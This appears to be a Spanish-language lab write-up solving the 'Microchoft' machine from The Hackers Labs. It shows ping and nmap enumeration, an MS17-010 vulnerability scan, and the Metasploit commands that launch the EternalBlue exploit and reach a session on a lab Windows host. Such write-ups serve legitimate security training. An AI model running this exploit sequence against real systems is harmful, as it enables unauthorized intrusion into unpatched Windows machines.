---
tags:
  - Cybersecurity
  - Labs
  - TheHackerLabs
  - Easy
  - Windows
  - SMB
  - EternalBlue
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
- [[#Explotación|Explotación]]
	- [[#Explotación#MS17-010 SMB (EternalBlue)|MS17-010 SMB (EternalBlue)]]

---
# Resolviendo la máquina Microchoft

>En esta publicación, comparto cómo resolví la máquina **Microchoft** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/55).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 192.168.1.137`

![[Pasted image 20250721101807.png]]

*TTL=128* -> **Windows**
### Nmap
`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.137 -oG allPorts`

![[Pasted image 20250721101836.png]]

`nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sCV 192.168.1.137 -oN targeted`

![[Pasted image 20250721101914.png]]

`nmap -p445 --script smb-vuln-ms17-010 192.168.1.137`

![[Pasted image 20250721102119.png]]

---
## Explotación
### MS17-010 SMB (EternalBlue)

Se utiliza el exploit (`exploit/windows/smb/ms17_010_eternalblue`) para la vulnerabilidad **MS17-010 (EternalBlue)** en el servicio **SMB**.

```
search exploit/windows/smb/ms17_010_eternalblue
use 0 | use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.137
exploit
```

![[Pasted image 20250721102904.png]]

`sysinfo`

![[Pasted image 20250721103337.png]]

`getuid`

![[Pasted image 20250721103401.png]]

---